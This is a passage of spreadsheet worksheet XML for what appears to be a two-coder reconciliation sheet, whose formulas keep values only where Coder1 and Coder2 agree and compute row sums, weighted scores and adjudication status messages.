        <f>IF(AND(Coder1!AA212&amp;""&lt;&gt;"",Coder1!AA212&amp;""=Coder2!AA212&amp;""),Coder1!AA212,"")</f>
        <v/>
      </c>
      <c r="AB212" s="14">
        <f>IF(AND(Coder1!AB212&amp;""&lt;&gt;"",Coder1!AB212&amp;""=Coder2!AB212&amp;""),Coder1!AB212,"")</f>
        <v/>
      </c>
      <c r="AC212" s="14">
        <f>IF(AND(Coder1!AC212&amp;""&lt;&gt;"",Coder1!AC212&amp;""=Coder2!AC212&amp;""),Coder1!AC212,"")</f>
        <v/>
      </c>
      <c r="AD212" s="14">
        <f>IF(AND(Coder1!AD212&amp;""&lt;&gt;"",Coder1!AD212&amp;""=Coder2!AD212&amp;""),Coder1!AD212,"")</f>
        <v/>
      </c>
      <c r="AE212" s="14">
        <f>IF(AND(Coder1!AE212&amp;""&lt;&gt;"",Coder1!AE212&amp;""=Coder2!AE212&amp;""),Coder1!AE212,"")</f>
        <v/>
      </c>
      <c r="AF212" s="14">
        <f>IF(AND(Coder1!AF212&amp;""&lt;&gt;"",Coder1!AF212&amp;""=Coder2!AF212&amp;""),Coder1!AF212,"")</f>
        <v/>
      </c>
      <c r="AG212" s="14">
        <f>IF(AND(Coder1!AG212&amp;""&lt;&gt;"",Coder1!AG212&amp;""=Coder2!AG212&amp;""),Coder1!AG212,"")</f>
        <v/>
      </c>
      <c r="AH212" s="14">
        <f>IF(AND(Coder1!AH212&amp;""&lt;&gt;"",Coder1!AH212&amp;""=Coder2!AH212&amp;""),Coder1!AH212,"")</f>
        <v/>
      </c>
      <c r="AI212" s="11">
        <f>IF(COUNT(E212:L212)=0,"",SUM(E212:L212))</f>
        <v/>
      </c>
      <c r="AJ212" s="11">
        <f>IF(AI212="","",N(E212)*3+N(F212)*2+N(G212)*2+N(H212)*2+N(I212)*2+N(J212)*3+N(K212)*3+N(L212)*3)</f>
        <v/>
      </c>
      <c r="AK212" s="11">
        <f>IF(AI212="","",COUNTIF(N212:AG212,1))</f>
        <v/>
      </c>
      <c r="AL212" s="11">
        <f>IF(OR(AJ212="",AJ212=0),"",ROUND(100*(AJ212-AK212)/AJ212,1))</f>
        <v/>
      </c>
      <c r="AM212" s="11">
        <f>IF(AND(Coder1!AN212=1,Coder2!AN212=1),IF(COUNTBLANK(E212:AH212)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN212" s="11">
        <f>IF(AND(Coder1!AN212=1,Coder2!AN212=1),IF(SUMPRODUCT(--(Coder1!E212:AH212&amp;""&lt;&gt;Coder2!E212:AH212&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO212" s="11" t="n"/>
    </row>
    <row r="213">
      <c r="A213" s="11">
        <f>Coder1!A213</f>
        <v/>
      </c>
      <c r="B213" s="11">
        <f>Coder1!B213</f>
        <v/>
      </c>
      <c r="C213" s="11">
        <f>Coder1!C213</f>
        <v/>
      </c>
      <c r="D213" s="11">
        <f>Coder1!D213</f>
        <v/>
      </c>
      <c r="E213" s="14">
        <f>IF(AND(Coder1!E213&amp;""&lt;&gt;"",Coder1!E213&amp;""=Coder2!E213&amp;""),Coder1!E213,"")</f>
        <v/>
      </c>
      <c r="F213" s="14">
        <f>IF(AND(Coder1!F213&amp;""&lt;&gt;"",Coder1!F213&amp;""=Coder2!F213&amp;""),Coder1!F213,"")</f>
        <v/>
      </c>
      <c r="G213" s="14">
        <f>IF(AND(Coder1!G213&amp;""&lt;&gt;"",Coder1!G213&amp;""=Coder2!G213&amp;""),Coder1!G213,"")</f>
        <v/>
      </c>
      <c r="H213" s="14">
        <f>IF(AND(Coder1!H213&amp;""&lt;&gt;"",Coder1!H213&amp;""=Coder2!H213&amp;""),Coder1!H213,"")</f>
        <v/>
      </c>
      <c r="I213" s="14">
        <f>IF(AND(Coder1!I213&amp;""&lt;&gt;"",Coder1!I213&amp;""=Coder2!I213&amp;""),Coder1!I213,"")</f>
        <v/>
      </c>
      <c r="J213" s="14">
        <f>IF(AND(Coder1!J213&amp;""&lt;&gt;"",Coder1!J213&amp;""=Coder2!J213&amp;""),Coder1!J213,"")</f>
        <v/>
      </c>
      <c r="K213" s="14">
        <f>IF(AND(Coder1!K213&amp;""&lt;&gt;"",Coder1!K213&amp;""=Coder2!K213&amp;""),Coder1!K213,"")</f>
        <v/>
      </c>
      <c r="L213" s="14">
        <f>IF(AND(Coder1!L213&amp;""&lt;&gt;"",Coder1!L213&amp;""=Coder2!L213&amp;""),Coder1!L213,"")</f>
        <v/>
      </c>
      <c r="M213" s="14">
        <f>IF(AND(Coder1!M213&amp;""&lt;&gt;"",Coder1!M213&amp;""=Coder2!M213&amp;""),Coder1!M213,"")</f>
        <v/>
      </c>
      <c r="N213" s="14">
        <f>IF(AND(Coder1!N213&amp;""&lt;&gt;"",Coder1!N213&amp;""=Coder2!N213&amp;""),Coder1!N213,"")</f>
        <v/>
      </c>
      <c r="O213" s="14">
        <f>IF(AND(Coder1!O213&amp;""&lt;&gt;"",Coder1!O213&amp;""=Coder2!O213&amp;""),Coder1!O213,"")</f>
        <v/>
      </c>
      <c r="P213" s="14">
        <f>IF(AND(Coder1!P213&amp;""&lt;&gt;"",Coder1!P213&amp;""=Coder2!P213&amp;""),Coder1!P213,"")</f>
        <v/>
      </c>
      <c r="Q213" s="14">
        <f>IF(AND(Coder1!Q213&amp;""&lt;&gt;"",Coder1!Q213&amp;""=Coder2!Q213&amp;""),Coder1!Q213,"")</f>
        <v/>
      </c>
      <c r="R213" s="14">
        <f>IF(AND(Coder1!R213&amp;""&lt;&gt;"",Coder1!R213&amp;""=Coder2!R213&amp;""),Coder1!R213,"")</f>
        <v/>
      </c>
      <c r="S213" s="14">
        <f>IF(AND(Coder1!S213&amp;""&lt;&gt;"",Coder1!S213&amp;""=Coder2!S213&amp;""),Coder1!S213,"")</f>
        <v/>
      </c>
      <c r="T213" s="14">
        <f>IF(AND(Coder1!T213&amp;""&lt;&gt;"",Coder1!T213&amp;""=Coder2!T213&amp;""),Coder1!T213,"")</f>
        <v/>
      </c>
      <c r="U213" s="14">
        <f>IF(AND(Coder1!U213&amp;""&lt;&gt;"",Coder1!U213&amp;""=Coder2!U213&amp;""),Coder1!U213,"")</f>
        <v/>
      </c>
      <c r="V213" s="14">
        <f>IF(AND(Coder1!V213&amp;""&lt;&gt;"",Coder1!V213&amp;""=Coder2!V213&amp;""),Coder1!V213,"")</f>
        <v/>
      </c>
      <c r="W213" s="14">
        <f>IF(AND(Coder1!W213&amp;""&lt;&gt;"",Coder1!W213&amp;""=Coder2!W213&amp;""),Coder1!W213,"")</f>
        <v/>
      </c>
      <c r="X213" s="14">
        <f>IF(AND(Coder1!X213&amp;""&lt;&gt;"",Coder1!X213&amp;""=Coder2!X213&amp;""),Coder1!X213,"")</f>
        <v/>
      </c>
      <c r="Y213" s="14">
        <f>IF(AND(Coder1!Y213&amp;""&lt;&gt;"",Coder1!Y213&amp;""=Coder2!Y213&amp;""),Coder1!Y213,"")</f>
        <v/>
      </c>
      <c r="Z213" s="14">
        <f>IF(AND(Coder1!Z213&amp;""&lt;&gt;"",Coder1!Z213&amp;""=Coder2!Z213&amp;""),Coder1!Z213,"")</f>
        <v/>
      </c>
      <c r="AA213" s="14">
        <f>IF(AND(Coder1!AA213&amp;""&lt;&gt;"",Coder1!AA213&amp;""=Coder2!AA213&amp;""),Coder1!AA213,"")</f>
        <v/>
      </c>
      <c r="AB213" s="14">
        <f>IF(AND(Coder1!AB213&amp;""&lt;&gt;"",Coder1!AB213&amp;""=Coder2!AB213&amp;""),Coder1!AB213,"")</f>
        <v/>
      </c>
      <c r="AC213" s="14">
        <f>IF(AND(Coder1!AC213&amp;""&lt;&gt;"",Coder1!AC213&amp;""=Coder2!AC213&amp;""),Coder1!AC213,"")</f>
        <v/>
      </c>
      <c r="AD213" s="14">
        <f>IF(AND(Coder1!AD213&amp;""&lt;&gt;"",Coder1!AD213&amp;""=Coder2!AD213&amp;""),Coder1!AD213,"")</f>
        <v/>
      </c>
      <c r="AE213" s="14">
        <f>IF(AND(Coder1!AE213&amp;""&lt;&gt;"",Coder1!AE213&amp;""=Coder2!AE213&amp;""),Coder1!AE213,"")</f>
        <v/>
      </c>
      <c r="AF213" s="14">
        <f>IF(AND(Coder1!AF213&amp;""&lt;&gt;"",Coder1!AF213&amp;""=Coder2!AF213&amp;""),Coder1!AF213,"")</f>
        <v/>
      </c>
      <c r="AG213" s="14">
        <f>IF(AND(Coder1!AG213&amp;""&lt;&gt;"",Coder1!AG213&amp;""=Coder2!AG213&amp;""),Coder1!AG213,"")</f>
        <v/>
      </c>
      <c r="AH213" s="14">
        <f>IF(AND(Coder1!AH213&amp;""&lt;&gt;"",Coder1!AH213&amp;""=Coder2!AH213&amp;""),Coder1!AH213,"")</f>
        <v/>
      </c>
      <c r="AI213" s="11">
        <f>IF(COUNT(E213:L213)=0,"",SUM(E213:L213))</f>
        <v/>
      </c>
      <c r="AJ213" s="11">
        <f>IF(AI213="","",N(E213)*3+N(F213)*2+N(G213)*2+N(H213)*2+N(I213)*2+N(J213)*3+N(K213)*3+N(L213)*3)</f>
        <v/>
      </c>
      <c r="AK213" s="11">
        <f>IF(AI213="","",COUNTIF(N213:AG213,1))</f>
        <v/>
      </c>
      <c r="AL213" s="11">
        <f>IF(OR(AJ213="",AJ213=0),"",ROUND(100*(AJ213-AK213)/AJ213,1))</f>
        <v/>
      </c>
      <c r="AM213" s="11">
        <f>IF(AND(Coder1!AN213=1,Coder2!AN213=1),IF(COUNTBLANK(E213:AH213)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN213" s="11">
        <f>IF(AND(Coder1!AN213=1,Coder2!AN213=1),IF(SUMPRODUCT(--(Coder1!E213:AH213&amp;""&lt;&gt;Coder2!E213:AH213&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO213" s="11" t="n"/>
    </row>
    <row r="214">
      <c r="A214" s="11">
        <f>Coder1!A214</f>
        <v/>
      </c>
      <c r="B214" s="11">
        <f>Coder1!B214</f>
        <v/>
      </c>
      <c r="C214" s="11">
        <f>Coder1!C214</f>
        <v/>
      </c>
      <c r="D214" s="11">
        <f>Coder1!D214</f>
        <v/>
      </c>
      <c r="E214" s="14">
        <f>IF(AND(Coder1!E214&amp;""&lt;&gt;"",Coder1!E214&amp;""=Coder2!E214&amp;""),Coder1!E214,"")</f>
        <v/>
      </c>
      <c r="F214" s="14">
        <f>IF(AND(Coder1!F214&amp;""&lt;&gt;"",Coder1!F214&amp;""=Coder2!F214&amp;""),Coder1!F214,"")</f>
        <v/>
      </c>
      <c r="G214" s="14">
        <f>IF(AND(Coder1!G214&amp;""&lt;&gt;"",Coder1!G214&amp;""=Coder2!G214&amp;""),Coder1!G214,"")</f>
        <v/>
      </c>
      <c r="H214" s="14">
        <f>IF(AND(Coder1!H214&amp;""&lt;&gt;"",Coder1!H214&amp;""=Coder2!H214&amp;""),Coder1!H214,"")</f>
        <v/>
      </c>
      <c r="I214" s="14">
        <f>IF(AND(Coder1!I214&amp;""&lt;&gt;"",Coder1!I214&amp;""=Coder2!I214&amp;""),Coder1!I214,"")</f>
        <v/>
      </c>
      <c r="J214" s="14">
        <f>IF(AND(Coder1!J214&amp;""&lt;&gt;"",Coder1!J214&amp;""=Coder2!J214&amp;""),Coder1!J214,"")</f>
        <v/>
      </c>
      <c r="K214" s="14">
        <f>IF(AND(Coder1!K214&amp;""&lt;&gt;"",Coder1!K214&amp;""=Coder2!K214&amp;""),Coder1!K214,"")</f>
        <v/>
      </c>
      <c r="L214" s="14">
        <f>IF(AND(Coder1!L214&amp;""&lt;&gt;"",Coder1!L214&amp;""=Coder2!L214&amp;""),Coder1!L214,"")</f>
        <v/>
      </c>
      <c r="M214" s="14">
        <f>IF(AND(Coder1!M214&amp;""&lt;&gt;"",Coder1!M214&amp;""=Coder2!M214&amp;""),Coder1!M214,"")</f>
        <v/>
      </c>
      <c r="N214" s="14">
        <f>IF(AND(Coder1!N214&amp;""&lt;&gt;"",Coder1!N214&amp;""=Coder2!N214&amp;""),Coder1!N214,"")</f>
        <v/>
      </c>
      <c r="O214" s="14">
        <f>IF(AND(Coder1!O214&amp;""&lt;&gt;"",Coder1!O214&amp;""=Coder2!O214&amp;""),Coder1!O214,"")</f>
        <v/>
      </c>
      <c r="P214" s="14">
        <f>IF(AND(Coder1!P214&amp;""&lt;&gt;"",Coder1!P214&amp;""=Coder2!P214&amp;""),Coder1!P214,"")</f>
        <v/>
      </c>
      <c r="Q214" s="14">
        <f>IF(AND(Coder1!Q214&amp;""&lt;&gt;"",Coder1!Q214&amp;""=Coder2!Q214&amp;""),Coder1!Q214,"")</f>
        <v/>
      </c>
      <c r="R214" s="14">
        <f>IF(AND(Coder1!R214&amp;""&lt;&gt;"",Coder1!R214&amp;""=Coder2!R214&amp;""),Coder1!R214,"")</f>
        <v/>
      </c>
      <c r="S214" s="14">
        <f>IF(AND(Coder1!S214&amp;""&lt;&gt;"",Coder1!S214&amp;""=Coder2!S214&amp;""),Coder1!S214,"")</f>
        <v/>
      </c>
      <c r="T214" s="14">
        <f>IF(AND(Coder1!T214&amp;""&lt;&gt;"",Coder1!T214&amp;""=Coder2!T214&amp;""),Coder1!T214,"")</f>
        <v/>
      </c>
      <c r="U214" s="14">
        <f>IF(AND(Coder1!U214&amp;""&lt;&gt;"",Coder1!U214&amp;""=Coder2!U214&amp;""),Coder1!U214,"")</f>
        <v/>
      </c>
      <c r="V214" s="14">
        <f>IF(AND(Coder1!V214&amp;""&lt;&gt;"",Coder1!V214&amp;""=Coder2!V214&amp;""),Coder1!V214,"")</f>
        <v/>
      </c>
      <c r="W214" s="14">
        <f>IF(AND(Coder1!W214&amp;""&lt;&gt;"",Coder1!W214&amp;""=Coder2!W214&amp;""),Coder1!W214,"")</f>
        <v/>
      </c>
      <c r="X214" s="14">
        <f>IF(AND(Coder1!X214&amp;""&lt;&gt;"",Coder1!X214&amp;""=Coder2!X214&amp;""),Coder1!X214,"")</f>
        <v/>
      </c>
      <c r="Y214" s="14">
        <f>IF(AND(Coder1!Y214&amp;""&lt;&gt;"",Coder1!Y214&amp;""=Coder2!Y214&amp;""),Coder1!Y214,"")</f>
        <v/>
      </c>
      <c r="Z214" s="14">
        <f>IF(AND(Coder1!Z214&amp;""&lt;&gt;"",Coder1!Z214&amp;""=Coder2!Z214&amp;""),Coder1!Z214,"")</f>
        <v/>
      </c>
      <c r="AA214" s="14">
        <f>IF(AND(Coder1!AA214&amp;""&lt;&gt;"",Coder1!AA214&amp;""=Coder2!AA214&amp;""),Coder1!AA214,"")</f>
        <v/>
      </c>
      <c r="AB214" s="14">
        <f>IF(AND(Coder1!AB214&amp;""&lt;&gt;"",Coder1!AB214&amp;""=Coder2!AB214&amp;""),Coder1!AB214,"")</f>
        <v/>
      </c>
      <c r="AC214" s="14">
        <f>IF(AND(Coder1!AC214&amp;""&lt;&gt;"",Coder1!AC214&amp;""=Coder2!AC214&amp;""),Coder1!AC214,"")</f>
        <v/>
      </c>
      <c r="AD214" s="14">
        <f>IF(AND(Coder1!AD214&amp;""&lt;&gt;"",Coder1!AD214&amp;""=Coder2!AD214&amp;""),Coder1!AD214,"")</f>
        <v/>
      </c>
      <c r="AE214" s="14">
        <f>IF(AND(Coder1!AE214&amp;""&lt;&gt;"",Coder1!AE214&amp;""=Coder2!AE214&amp;""),Coder1!AE214,"")</f>
        <v/>
      </c>
      <c r="AF214" s="14">
        <f>IF(AND(Coder1!AF214&amp;""&lt;&gt;"",Coder1!AF214&amp;""=Coder2!AF214&amp;""),Coder1!AF214,"")</f>
        <v/>
      </c>
      <c r="AG214" s="14">
        <f>IF(AND(Coder1!AG214&amp;""&lt;&gt;"",Coder1!AG214&amp;""=Coder2!AG214&amp;""),Coder1!AG214,"")</f>
        <v/>
      </c>
      <c r="AH214" s="14">
        <f>IF(AND(Coder1!AH214&amp;""&lt;&gt;"",Coder1!AH214&amp;""=Coder2!AH214&amp;""),Coder1!AH214,"")</f>
        <v/>
      </c>
      <c r="AI214" s="11">
        <f>IF(COUNT(E214:L214)=0,"",SUM(E214:L214))</f>
        <v/>
      </c>
      <c r="AJ214" s="11">
        <f>IF(AI214="","",N(E214)*3+N(F214)*2+N(G214)*2+N(H214)*2+N(I214)*2+N(J214)*3+N(K214)*3+N(L214)*3)</f>
        <v/>
      </c>
      <c r="AK214" s="11">
        <f>IF(AI214="","",COUNTIF(N214:AG214,1))</f>
        <v/>
      </c>
      <c r="AL214" s="11">
        <f>IF(OR(AJ214="",AJ214=0),"",ROUND(100*(AJ214-AK214)/AJ214,1))</f>
        <v/>
      </c>
      <c r="AM214" s="11">
        <f>IF(AND(Coder1!AN214=1,Coder2!AN214=1),IF(COUNTBLANK(E214:AH214)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN214" s="11">
        <f>IF(AND(Coder1!AN214=1,Coder2!AN214=1),IF(SUMPRODUCT(--(Coder1!E214:AH214&amp;""&lt;&gt;Coder2!E214:AH214&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO214" s="11" t="n"/>
    </row>
    <row r="215">
      <c r="A215" s="11">
        <f>Coder1!A215</f>
        <v/>
      </c>
      <c r="B215" s="11">
        <f>Coder1!B215</f>
        <v/>
      </c>
      <c r="C215" s="11">
        <f>Coder1!C215</f>
        <v/>
      </c>
      <c r="D215" s="11">
        <f>Coder1!D215</f>
        <v/>
      </c>
      <c r="E215" s="14">
        <f>IF(AND(Coder1!E215&amp;""&lt;&gt;"",Coder1!E215&amp;""=Coder2!E215&amp;""),Coder1!E215,"")</f>
        <v/>
      </c>
      <c r="F215" s="14">
        <f>IF(AND(Coder1!F215&amp;""&lt;&gt;"",Coder1!F215&amp;""=Coder2!F215&amp;""),Coder1!F215,"")</f>
        <v/>
      </c>
      <c r="G215" s="14">
        <f>IF(AND(Coder1!G215&amp;""&lt;&gt;"",Coder1!G215&amp;""=Coder2!G215&amp;""),Coder1!G215,"")</f>
        <v/>
      </c>
      <c r="H215" s="14">
        <f>IF(AND(Coder1!H215&amp;""&lt;&gt;"",Coder1!H215&amp;""=Coder2!H215&amp;""),Coder1!H215,"")</f>
        <v/>
      </c>
      <c r="I215" s="14">
        <f>IF(AND(Coder1!I215&amp;""&lt;&gt;"",Coder1!I215&amp;""=Coder2!I215&amp;""),Coder1!I215,"")</f>
        <v/>
      </c>
      <c r="J215" s="14">
        <f>IF(AND(Coder1!J215&amp;""&lt;&gt;"",Coder1!J215&amp;""=Coder2!J215&amp;""),Coder1!J215,"")</f>
        <v/>
      </c>
      <c r="K215" s="14">
        <f>IF(AND(Coder1!K215&amp;""&lt;&gt;"",Coder1!K215&amp;""=Coder2!K215&amp;""),Coder1!K215,"")</f>
        <v/>
      </c>
      <c r="L215" s="14">
        <f>IF(AND(Coder1!L215&amp;""&lt;&gt;"",Coder1!L215&amp;""=Coder2!L215&amp;""),Coder1!L215,"")</f>
        <v/>
      </c>
      <c r="M215" s="14">
        <f>IF(AND(Coder1!M215&amp;""&lt;&gt;"",Coder1!M215&amp;""=Coder2!M215&amp;""),Coder1!M215,"")</f>
        <v/>
      </c>
      <c r="N215" s="14">
        <f>IF(AND(Coder1!N215&amp;""&lt;&gt;"",Coder1!N215&amp;""=Coder2!N215&amp;""),Coder1!N215,"")</f>
        <v/>
      </c>
      <c r="O215" s="14">
        <f>IF(AND(Coder1!O215&amp;""&lt;&gt;"",Coder1!O215&amp;""=Coder2!O215&amp;""),Coder1!O215,"")</f>
        <v/>
      </c>
      <c r="P215" s="14">
        <f>IF(AND(Coder1!P215&amp;""&lt;&gt;"",Coder1!P215&amp;""=Coder2!P215&amp;""),Coder1!P215,"")</f>
        <v/>
      </c>
      <c r="Q215" s="14">
        <f>IF(AND(Coder1!Q215&amp;""&lt;&gt;"",Coder1!Q215&amp;""=Coder2!Q215&amp;""),Coder1!Q215,"")</f>
        <v/>
      </c>
      <c r="R215" s="14">
        <f>IF(AND(Coder1!R215&amp;""&lt;&gt;"",Coder1!R215&amp;""=Coder2!R215&amp;""),Coder1!R215,"")</f>
        <v/>
      </c>
      <c r="S215" s="14">
        <f>IF(AND(Coder1!S215&amp;""&lt;&gt;"",Coder1!S215&amp;""=Coder2!S215&amp;""),Coder1!S215,"")</f>
        <v/>
      </c>
      <c r="T215" s="14">
        <f>IF(AND(Coder1!T215&amp;""&lt;&gt;"",Coder1!T215&amp;""=Coder2!T215&amp;""),Coder1!T215,"")</f>
        <v/>
      </c>
      <c r="U215" s="14">
        <f>IF(AND(Coder1!U215&amp;""&lt;&gt;"",Coder1!U215&amp;""=Coder2!U215&amp;""),Coder1!U215,"")</f>
        <v/>
      </c>
      <c r="V215" s="14">
        <f>IF(AND(Coder1!V215&amp;""&lt;&gt;"",Coder1!V215&amp;""=Coder2!V215&amp;""),Coder1!V215,"")</f>
        <v/>
      </c>
      <c r="W215" s="14">
        <f>IF(AND(Coder1!W215&amp;""&lt;&gt;"",Coder1!W215&amp;""=Coder2!W215&amp;""),Coder1!W215,"")</f>
        <v/>
      </c>
      <c r="X215" s="14">
        <f>IF(AND(Coder1!X215&amp;""&lt;&gt;"",Coder1!X215&amp;""=Coder2!X215&amp;""),Coder1!X215,"")</f>
        <v/>
      </c>
      <c r="Y215" s="14">
        <f>IF(AND(Coder1!Y215&amp;""&lt;&gt;"",Coder1!Y215&amp;""=Coder2!Y215&amp;""),Coder1!Y215,"")</f>
        <v/>
      </c>
      <c r="Z215" s="14">
        <f>IF(AND(Coder1!Z215&amp;""&lt;&gt;"",Coder1!Z215&amp;""=Coder2!Z215&amp;""),Coder1!Z215,"")</f>
        <v/>
      </c>
      <c r="AA215" s="14">
        <f>IF(AND(Coder1!AA215&amp;""&lt;&gt;"",Coder1!AA215&amp;""=Coder2!AA215&amp;""),Coder1!AA215,"")</f>
        <v/>
      </c>
      <c r="AB215" s="14">
        <f>IF(AND(Coder1!AB215&amp;""&lt;&gt;"",Coder1!AB215&amp;""=Coder2!AB215&amp;""),Coder1!AB215,"")</f>
        <v/>
      </c>
      <c r="AC215" s="14">
        <f>IF(AND(Coder1!AC215&amp;""&lt;&gt;"",Coder1!AC215&amp;""=Coder2!AC215&amp;""),Coder1!AC215,"")</f>
        <v/>
      </c>
      <c r="AD215" s="14">
        <f>IF(AND(Coder1!AD215&amp;""&lt;&gt;"",Coder1!AD215&amp;""=Coder2!AD215&amp;""),Coder1!AD215,"")</f>
        <v/>
      </c>
      <c r="AE215" s="14">
        <f>IF(AND(Coder1!AE215&amp;""&lt;&gt;"",Coder1!AE215&amp;""=Coder2!AE215&amp;""),Coder1!AE215,"")</f>
        <v/>
      </c>
      <c r="AF215" s="14">
        <f>IF(AND(Coder1!AF215&amp;""&lt;&gt;"",Coder1!AF215&amp;""=Coder2!AF215&amp;""),Coder1!AF215,"")</f>
        <v/>
      </c>
      <c r="AG215" s="14">
        <f>IF(AND(Coder1!AG215&amp;""&lt;&gt;"",Coder1!AG215&amp;""=Coder2!AG215&amp;""),Coder1!AG215,"")</f>
        <v/>
      </c>
      <c r="AH215" s="14">
        <f>IF(AND(Coder1!AH215&amp;""&lt;&gt;"",Coder1!AH215&amp;""=Coder2!AH215&amp;""),Coder1!AH215,"")</f>
        <v/>
      </c>
      <c r="AI215" s="11">
        <f>IF(COUNT(E215:L215)=0,"",SUM(E215:L215))</f>
        <v/>
      </c>
      <c r="AJ215" s="11">
        <f>IF(AI215="","",N(E215)*3+N(F215)*2+N(G215)*2+N(H215)*2+N(I215)*2+N(J215)*3+N(K215)*3+N(L215)*3)</f>
        <v/>
      </c>
      <c r="AK215" s="11">
        <f>IF(AI215="","",COUNTIF(N215:AG215,1))</f>
        <v/>
      </c>
      <c r="AL215" s="11">
        <f>IF(OR(AJ215="",AJ215=0),"",ROUND(100*(AJ215-AK215)/AJ215,1))</f>
        <v/>
      </c>
      <c r="AM215" s="11">
        <f>IF(AND(Coder1!AN215=1,Coder2!AN215=1),IF(COUNTBLANK(E215:AH215)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN215" s="11">
        <f>IF(AND(Coder1!AN215=1,Coder2!AN215=1),IF(SUMPRODUCT(--(Coder1!E215:AH215&amp;""&lt;&gt;Coder2!E215:AH215&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO215" s="11" t="n"/>
    </row>
    <row r="216">
      <c r="A216" s="11">
        <f>Coder1!A216</f>
        <v/>
      </c>
      <c r="B216" s="11">
        <f>Coder1!B216</f>
        <v/>
      </c>
      <c r="C216" s="11">
        <f>Coder1!C216</f>
        <v/>
      </c>
      <c r="D216" s="11">
        <f>Coder1!D216</f>
        <v/>
      </c>
      <c r="E216" s="14">
        <f>IF(AND(Coder1!E216&amp;""&lt;&gt;"",Coder1!E216&amp;""=Coder2!E216&amp;""),Coder1!E216,"")</f>
        <v/>
      </c>
      <c r="F216" s="14">
        <f>IF(AND(Coder1!F216&amp;""&lt;&gt;"",Coder1!F216&amp;""=Coder2!F216&amp;""),Coder1!F216,"")</f>
        <v/>
      </c>
      <c r="G216" s="14">
        <f>IF(AND(Coder1!G216&amp;""&lt;&gt;"",Coder1!G216&amp;""=Coder2!G216&amp;""),Coder1!G216,"")</f>
        <v/>
      </c>
      <c r="H216" s="14">
        <f>IF(AND(Coder1!H216&amp;""&lt;&gt;"",Coder1!H216&amp;""=Coder2!H216&amp;""),Coder1!H216,"")</f>
        <v/>
      </c>
      <c r="I216" s="14">
        <f>IF(AND(Coder1!I216&amp;""&lt;&gt;"",Coder1!I216&amp;""=Coder2!I216&amp;""),Coder1!I216,"")</f>
        <v/>
      </c>
      <c r="J216" s="14">
        <f>IF(AND(Coder1!J216&amp;""&lt;&gt;"",Coder1!J216&amp;""=Coder2!J216&amp;""),Coder1!J216,"")</f>
        <v/>
      </c>
      <c r="K216" s="14">
        <f>IF(AND(Coder1!K216&amp;""&lt;&gt;"",Coder1!K216&amp;""=Coder2!K216&amp;""),Coder1!K216,"")</f>
        <v/>
      </c>
      <c r="L216" s="14">
        <f>IF(AND(Coder1!L216&amp;""&lt;&gt;"",Coder1!L216&amp;""=Coder2!L216&amp;""),Coder1!L216,"")</f>
        <v/>
      </c>
      <c r="M216" s="14">
        <f>IF(AND(Coder1!M216&amp;""&lt;&gt;"",Coder1!M216&amp;""=Coder2!M216&amp;""),Coder1!M216,"")</f>
        <v/>
      </c>
      <c r="N216" s="14">
        <f>IF(AND(Coder1!N216&amp;""&lt;&gt;"",Coder1!N216&amp;""=Coder2!N216&amp;""),Coder1!N216,"")</f>
        <v/>
      </c>
      <c r="O216" s="14">
        <f>IF(AND(Coder1!O216&amp;""&lt;&gt;"",Coder1!O216&amp;""=Coder2!O216&amp;""),Coder1!O216,"")</f>
        <v/>
      </c>
      <c r="P216" s="14">
        <f>IF(AND(Coder1!P216&amp;""&lt;&gt;"",Coder1!P216&amp;""=Coder2!P216&amp;""),Coder1!P216,"")</f>
        <v/>
      </c>
      <c r="Q216" s="14">
        <f>IF(AND(Coder1!Q216&amp;""&lt;&gt;"",Coder1!Q216&amp;""=Coder2!Q216&amp;""),Coder1!Q216,"")</f>
        <v/>
      </c>
      <c r="R216" s="14">
        <f>IF(AND(Coder1!R216&amp;""&lt;&gt;"",Coder1!R216&amp;""=Coder2!R216&amp;""),Coder1!R216,"")</f>
        <v/>
      </c>
      <c r="S216" s="14">
        <f>IF(AND(Coder1!S216&amp;""&lt;&gt;"",Coder1!S216&amp;""=Coder2!S216&amp;""),Coder1!S216,"")</f>
        <v/>
      </c>
      <c r="T216" s="14">
        <f>IF(AND(Coder1!T216&amp;""&lt;&gt;"",Coder1!T216&amp;""=Coder2!T216&amp;""),Coder1!T216,"")</f>
        <v/>
      </c>
      <c r="U216" s="14">
        <f>IF(AND(Coder1!U216&amp;""&lt;&gt;"",Coder1!U216&amp;""=Coder2!U216&amp;""),Coder1!U216,"")</f>
        <v/>
      </c>
      <c r="V216" s="14">
        <f>IF(AND(Coder1!V216&amp;""&lt;&gt;"",Coder1!V216&amp;""=Coder2!V216&amp;""),Coder1!V216,"")</f>
        <v/>
      </c>
      <c r="W216" s="14">
        <f>IF(AND(Coder1!W216&amp;""&lt;&gt;"",Coder1!W216&amp;""=Coder2!W216&amp;""),Coder1!W216,"")</f>
        <v/>
      </c>
      <c r="X216" s="14">
        <f>IF(AND(Coder1!X216&amp;""&lt;&gt;"",Coder1!X216&amp;""=Coder2!X216&amp;""),Coder1!X216,"")</f>
        <v/>
      </c>
      <c r="Y216" s="14">
        <f>IF(AND(Coder1!Y216&amp;""&lt;&gt;"",Coder1!Y216&amp;""=Coder2!Y216&amp;""),Coder1!Y216,"")</f>
        <v/>
      </c>
      <c r="Z216" s="14">
        <f>IF(AND(Coder1!Z216&amp;""&lt;&gt;"",Coder1!Z216&amp;""=Coder2!Z216&amp;""),Coder1!Z216,"")</f>
        <v/>
      </c>
      <c r="AA216" s="14">
        <f>IF(AND(Coder1!AA216&amp;""&lt;&gt;"",Coder1!AA216&amp;""=Coder2!AA216&amp;""),Coder1!AA216,"")</f>
        <v/>
      </c>
      <c r="AB216" s="14">
        <f>IF(AND(Coder1!AB216&amp;""&lt;&gt;"",Coder1!AB216&amp;""=Coder2!AB216&amp;""),Coder1!AB216,"")</f>
        <v/>
      </c>
      <c r="AC216" s="14">
        <f>IF(AND(Coder1!AC216&amp;""&lt;&gt;"",Coder1!AC216&amp;""=Coder2!AC216&amp;""),Coder1!AC216,"")</f>
        <v/>
      </c>
      <c r="AD216" s="14">
